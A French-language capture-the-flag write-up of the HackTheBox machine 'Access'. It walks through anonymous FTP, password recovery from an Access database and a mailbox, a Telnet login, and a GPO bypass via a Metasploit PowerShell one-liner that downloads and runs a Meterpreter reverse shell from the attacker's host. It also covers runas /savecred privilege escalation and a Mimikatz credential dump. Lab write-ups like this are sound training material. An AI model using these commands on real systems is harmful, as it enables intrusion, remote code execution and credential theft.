# Solution du CTF Access de HackTheBox

/r/youseeingthisshit
--------------------

Alors le CTF s'appelle *Access*. Aurons nous droit à de l'injection SQL ? Suspense :p  

```plain
Nmap scan report for 10.10.10.98
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
|_banner: 220 Microsoft FTP Service
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
-- snip --
```

Cette machine Windows dispose d'un serveur FTP autorisant la connexion anonyme, d'un serveur Telnet (plaintext thug) et enfin d'un serveur web IIS.  

On trouve deux fichiers sur le FTP dans des dossiers différents. On peut avoir recours à Wget pour les télécharger :  

```bash
wget --no-passive-ftp ftp://10.10.10.98/Backups/backup.mdb
wget --no-passive-ftp 'ftp://10.10.10.98/Engineer/Access Control.zip'
```

L'archive zip doit être au format 7z car on obtient un message d'erreur lors de la décompression :  

```bash
$ unzip  Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

Et 7zip réclame lui un password pour désarchiver les fichiers. On peut se servir de l'utilisateur zip2john pour obtenir un hash correspondant au mot de passe de l'archive et tenter de le casser via dictionnaire :  

```bash
$ zip2john Access\ Control.zip
Access Control.zip:$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*ZFILE*Access Control.zip*0*4d*9dcc2150285eb46bd46a*$/zip2$:::::Access Control.zip
```

Tester tous les passwords d'une liste comme rockyou se fait rapidement ici mais aucun mot de passe valide n'est trouvé :| Il est temps de se pencher sur le fichier MDB (base de données *Access*).  

I'm in your emailz, reading your passwordz
------------------------------------------

Pas vraiment l'envie ni le courage de trouver un MS Access ou de convertir le MDB dans je ne sais quel format... Du coup j'ai cherché et rapidement trouvé le site [MDB Opener](https://www.mdbopener.com/) qui répond parfaitement à les attentes.  

Il permet de naviguer dans les différentes tables de la base, de télécharger une version XLS ou des fichier CSV. J'ai vite trouvé mon bonheur dans l'une des tables :  

```plain
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Le mot de passe *access4u@security* permet de déchiffrer l'archive. J'ai ensuite utilisé l'utilitaire *readpst* pour extraire les mails du PST :  

```plain
$ readpst  Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
    "Access Control" - 2 items done, 0 items skipped.
```

Dans la corbeille on trouve ce courrier intéressant :  

```plain
From "john@megacorp.com" Fri Aug 24 01:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-688489768_-_-"

----boundary-LibPST-iamunique-688489768_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-688489768_-_-"

--alt---boundary-LibPST-iamunique-688489768_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```

Le mot de passe nous ouvre les portes du Telnet :  

```plain
$ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

10/10/2018  04:50 PM    <DIR>          .
10/10/2018  04:50 PM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
10/10/2018  04:50 PM            73,802 access.exe
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
10/10/2018  04:53 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               1 File(s)         73,802 bytes
              14 Dir(s)  16,758,099,968 bytes free

C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
08/21/2018  11:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,757,641,216 bytes free

C:\Users\security\Desktop>type user.txt
ff1f3b48913b213a31ff6756d2553d38
```

DIDN'T READ LOL
---------------

On arrive donc sur ce système avec les utilisateurs et les infos suivantes :  

```plain
User accounts for \\ACCESS

-------------------------------------------------------------------------------
Administrator            engineer                 Guest
security
The command completed successfully.

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
Hotfix(s):                 110 Hotfix(s) Installed
```

Un *tasklist* nous indique qu'à première vue aucun antivirus ne tourne sur la machine et d'ailleurs l'upload d'une backdoor quelconque ne semble pas poser de problèmes.  

On est toutefois bloqué par une GPO si on tente d'exécuter un exe :  

```plain
C:\Users\security>\\10.10.14.177\public\backd.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

C'est une restriction en mousse (tm) très vite bypassée via PowerShell en utilisant le module *web\_delivery* de *Metasploit* (ce module génère une ligne de commande utilisant au choix Powershell, Python, PHP, etc qui va télécharger et exécuter du code) :  

```plain
msf exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.177     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)

Payload options (windows/x64/meterpreter/reverse_tcp_rc4):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   EXITFUNC     process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST        10.10.14.177     yes       The listen address (an interface may be specified)
   LPORT        4444             yes       The listen port
   RC4PASSWORD  msf              yes       Password to derive RC4 key from

Exploit target:

   Id  Name
   --  ----
   2   PSH

msf exploit(multi/script/web_delivery) > exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.177:4444
msf exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.14.177:8080/imyRs8I0j3wnU
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $R=new-object net.webclient;$R.proxy=[Net.WebRequest]::GetSystemWebProxy();$R.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $R.downloadstring('http://10.10.14.177:8080/imyRs8I0j3wnU');
[*] 10.10.10.98      web_delivery - Delivering Payload
[*] 10.10.10.98      web_delivery - Delivering Payload
[*] Sending stage (206407 bytes) to 10.10.10.98
[*] Meterpreter session 1 opened (10.10.14.177:4444 -> 10.10.10.98:49164) at 2018-10-12 10:11:55 +0200
```

On enchaîne alors sur le module *local\_exploit\_suggester* pour chercher une faille d'escalade de privilèges :  

```plain
msf exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.98 - Collecting local exploits for x64/windows...
[*] 10.10.10.98 - 17 exploit checks are being tried...
[+] 10.10.10.98 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.98 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[*] Post module execution completed
```

Aucune de ces deux vulnérabilité ne s'avère exploitable... C'est le moment de se sortir les doigts et d'explorer le système par soit même.  

J'ai bien trouvé quelques credentials sur le système :  

```plain
c:\temp\scripts>type 1_CREATE_SYSDBA.sql
CREATE LOGIN  WITH PASSWORD='', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;CREATE LOGIN sysdba WITH PASSWORD='masterkey', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;

c:\temp\scripts>type README_FIRST.txt
Open the SQL Management Studio application located either here:
   "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
Or here:
   "C:\Program Files\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"

- When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".

   "Login:" = "sa"
   "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"

- Click "Connect", once connected click on the "Open File" icon, navigate to the folder where the scripts are saved (c:\temp\scripts).
- Select each script in order of name by the first number in the name and run them in order e.g. "1_CREATE_SYSDBA.sql" then "2_ALTER_SERVER_ROLE.sql" then "3_SP_ATTACH_DB.sql" then "4_ALTER_AUTHORIZATION.sql"
If the scripts begin from "2_*.sql" or "3_*.sql" it means the previous scripts ran fine, so begin from the lowest script number ascending.

For the vbs scripts:
- Go to windows Services and stop ALL SQL related services.
- Open command prompt with elevated privileges (Administrator).
- paste the following commands in command prompt for each script and click ENTER...
    1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"
    2. cmd.exe /c WScript.exe "c:\temp\scripts\SQLServerCfgPort.vbs" "C:\Windows\system32" "c:\temp\logs\" "NO_INSTANCES_FOUND"
    3. cmd.exe /c WScript.exe "c:\temp\scripts\SetAccessRuleOnDirectory.vbs" "C:\Windows\system32" "c:\temp\logs\" "NT AUTHORITY\SYSTEM" "C:\\Portal\database"
    4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe "c:\temp\scripts\RestartServiceByDescriptionNameLike.vbs" "C:\Windows\system32" "c:\temp\logs\" "SQL Server (NO_INSTANCES_FOUND)"
```

J'ai trouvé un fichier LNK intéressant dans le Deskop de l'utilisateur spécial Public :  

```plain
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,772,091,904 bytes free
```

Un strings retourne le résultat suivant :  

```plain
/C:\
Windows
System32
runas.exe
C:\Windows\System32\runas.exe
%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico
access
1SPS
```

Histoire de faire un peu de code PowerShell j'ai écrit une fonction (voir à la fin de l'article) permettant de parser des fichiers LNK.  

Ainsi trouver notre LNK en fouillant tous ceux du système peut se faire de cette façon :  

```plain
PS C:\temp> get-childitem -path c:/ -filter "*.lnk" -recurse -force -erroraction silentlycontinue | Parse-LnkFile | where {$_.Arguments -like "*savecred*"}

Lnk File    : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
Lnk Target  : C:\Windows\System32\runas.exe
OnDisk      : True
Arguments   : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
Description :
```

Un LNK faisant appel à la commande *runas* avec le paramètre *savecred* est [une technique](https://www.howtogeek.com/124087/how-to-create-a-shortcut-that-lets-a-standard-user-run-an-application-as-administrator/) permettant à un utilisateur non privilégié d'exécuter une commande en tant qu'un autre utilisateur (ici *Administrator*).  

On a les droits pour écrire des fichiers dans le dossier *ZKAccess3.5* mais pas suffisamment pour écraser le fichier *Access.exe*.  

Peu importe, à partir du moment où le système a conservé en mémoire le mot de passe on peut taper n'importe quelle commande *runas* du moment que l'on spécifie l'option */savecred* : Windows va utiliser le mot de passe *Administrator* conservé en mémoire. Il aurait fallu se renseigner sur une commande avant de l'utiliser comme ça ! :p  

On peut réutiliser le module *web\_delivery* :  

```bash
runas /user:administrator /savecred "cmd.exe /C powershell -nop -exec bypass -c IEX (New-Object net.webclient).downloadString('http://10.10.14.177:8080/imyRs8I0j3wnU')"
```

```plain
[*] 10.10.10.98      web_delivery - Delivering Payload
[*] Sending stage (206407 bytes) to 10.10.10.98
[*] Meterpreter session 3 opened (10.10.14.177:4444 -> 10.10.10.98:49161) at 2018-10-12 10:31:32 +0200

msf exploit(multi/script/web_delivery) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  2         meterpreter x64/windows  ACCESS\security @ ACCESS       10.10.14.177:4444 -> 10.10.10.98:49158 (10.10.10.98)
  3         meterpreter x64/windows  ACCESS\Administrator @ ACCESS  10.10.14.177:4444 -> 10.10.10.98:49161 (10.10.10.98)

meterpreter > cd c:/users/administrator/desktop
meterpreter > ls
Listing: c:\users\administrator\desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-08-21 23:55:15 +0200  desktop.ini
100666/rw-rw-rw-  32    fil   2018-08-22 00:07:29 +0200  root.txt

meterpreter > download root.txt
[*] Downloading: root.txt -> root.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): root.txt -> root.txt
[*] download   : root.txt -> root.txt
meterpreter > cat root.txt
6e1586cc7ab230a8d297e8f933d904cf
```

Pour le plaisir et comme aucun AV n'est présent on peut uploader et lancer un petit *Mimikatz* :  

```plain
c:\users\administrator\downloads>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 2843824 (00000000:002b64b0)
Session           : Interactive from 0
User Name         : security
Domain            : ACCESS
Logon Server      : ACCESS
Logon Time        : 10/12/2018 10:03:59 AM
SID               : S-1-5-21-953262931-566350628-63446256-1001
    msv :
     [00000003] Primary
     * Username : security
     * Domain   : ACCESS
     * NTLM     : b41db16a61cb04b231625de260163015
     * SHA1     : 75f1e3aa023a0f57d4225f3ab4f18f6fea025414
    tspkg :
     * Username : security
     * Domain   : ACCESS
     * Password : 4Cc3ssC0ntr0ller
    wdigest :
     * Username : security
     * Domain   : ACCESS
     * Password : 4Cc3ssC0ntr0ller
    kerberos :
     * Username : security
     * Domain   : ACCESS
     * Password : 4Cc3ssC0ntr0ller
    ssp :
    credman :
     [00000000]
     * Username : ACCESS\Administrator
     * Domain   : ACCESS\Administrator
     * Password : 55Acc3ssS3cur1ty@megacorp
     [00000001]
     * Username : access\engineer
     * Domain   : access\engineer
     * Password : (null)
```

PowerShell Parse-LnkFile is good for you
----------------------------------------

C'est mon premier script PowerShell, tout commentaire est le bienvenue :  

```plain
function Parse-LnkFile{
<#
    .SYNOPSIS

        Parse-LnkFile extracts several informations from a Windows .LNK file.

    .DESCRIPTION

        Returns an object with several informations about a .LNK file : .LNK path on the disk, path of the target, arguments for that target and whether the target is on disk or not.

    .PARAMETER
        A FileInfo object for a .LNK file or a path (string).

    .AUTHOR
        Nicolas SURRIBAS aka devloop

    .LINK
        http://devloop.users.sourceforge.net/

    .EXAMPLE

        PS C:\> Parse-LnkFile test.txt.lnk

        Returns the File on disk which the lnk file redirects to.

    .EXAMPLE

        PS C:\> get-childitem . -filter "*.lnk" | parse-lnkfile | where-object {$_.Arguments -like "*savecred*"}

        Find every lnk file lauching a command where "savecred" can be found in the parameters.

#>
    [CmdletBinding()]
    param (
        [Parameter(
            Position=1,
            Mandatory=$true,
            ValueFromPipeline=$true,
            ParameterSetName="text"
        )]
        [string]$filename,

        [Parameter(
            Position=1,
            Mandatory=$true,
            ValueFromPipeline=$true,
            ParameterSetName="object"
        )]
        [System.IO.FileInfo]$file
    )

    PROCESS{
        Switch ($PSCmdlet.ParameterSetName) {
            "text" {
                $file = [System.IO.DirectoryInfo](Resolve-Path $filename).Path
                $filepath = $file.fullname
                Continue
            }
            "object" {
                $filepath = $file.fullname
                Continue
            }
        }

        $com = New-Object -ComObject WScript.Shell

        try{
            $lnk = $com.CreateShortcut($filepath)
        }

        catch {Write-Error $error[0].Exception}

        $custom_object = New-Object PSObject
        $custom_object | Add-Member -Name "Lnk File" -MemberType NoteProperty -Value $filepath
        $custom_object | Add-Member -Name "Lnk Target" -MemberType NoteProperty -Value $lnk.TargetPath
        if ($lnk.TargetPath) {
            $custom_object | Add-Member -Name "OnDisk" -MemberType NoteProperty -Value $(Test-Path $lnk.TargetPath)
        } else {
            $custom_object | Add-Member -Name "OnDisk" -MemberType NoteProperty -Value ""
        }
        $custom_object | Add-Member -Name "Arguments" -MemberType NoteProperty -Value $lnk.Arguments
        $custom_object | Add-Member -Name "Description" -MemberType NoteProperty -Value $lnk.Description
        Write-Output $custom_object

    }
}
```


*Published March 02 2019 at 16:41*